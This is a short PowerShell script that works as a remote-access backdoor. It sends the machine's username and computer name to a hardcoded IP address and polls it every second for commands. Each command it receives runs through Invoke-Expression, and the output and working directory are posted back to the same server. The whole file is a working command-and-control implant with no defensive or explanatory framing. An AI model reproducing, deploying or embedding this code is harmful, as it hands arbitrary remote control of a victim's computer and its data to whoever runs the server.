Add-Type -AssemblyName System.Web

cd $env:userprofile

$username = [System.Web.HttpUtility]::UrlEncode($env:USERNAME);
$computername = [System.Web.HttpUtility]::UrlEncode($env:COMPUTERNAME);;

while($true) {
    $request = (Invoke-WebRequest -UseBasicParsing -Uri "http://89.221.217.68/PSRemote/api.php?action=pull_cmd&username=${username}&computername=${computername}").Content

    if ($request.Length -gt 0) {        
        $id = $request.Substring(0, $request.IndexOf("|"));
        $cmd_expression = $request.Substring($request.IndexOf("|") + 1);

        $cmd_output = "";

        if($cmd_expression.Length -gt 0) {
            $cmd_expression = $cmd_expression + " 2>&1";
            $cmd_output = Invoke-Expression $cmd_expression | Out-String -Width 80;
        }

        $path = (Get-Location).Path

        $post_data = @{
            output=$cmd_output;
            id=$id;
            path=$path;
        }

        Invoke-WebRequest -UseBasicParsing 'http://89.221.217.68/PSRemote/api.php?action=send_output' -Method POST -Body $post_data;
    }

    Start-Sleep -Seconds 1;
}
